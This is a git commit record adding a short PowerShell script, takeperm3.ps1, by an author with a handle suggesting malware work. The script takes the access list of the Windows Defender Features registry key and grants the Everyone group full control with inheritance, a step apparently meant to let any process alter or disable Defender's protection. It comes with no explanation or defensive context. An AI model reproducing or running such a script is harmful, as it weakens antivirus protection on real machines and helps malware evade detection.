4848ec1cadaa89948a485c7fb89c4b81a1b84b3e
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-02-23 14:40:54 +0700

    Create takeperm3.ps1

---
+++ takeperm3.ps1
@@ -0,0 +1,9 @@
+$acl = Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
+$person = [System.Security.Principal.NTAccount]"Everyone"          
+$access = [System.Security.AccessControl.RegistryRights]"FullControl"
+$inheritance = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
+$propagation = [System.Security.AccessControl.PropagationFlags]"None"
+$type = [System.Security.AccessControl.AccessControlType]"Allow"
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule($person,$access,$inheritance,$propagation,$type)
+$acl.AddAccessRule($rule)
+$acl |Set-Acl
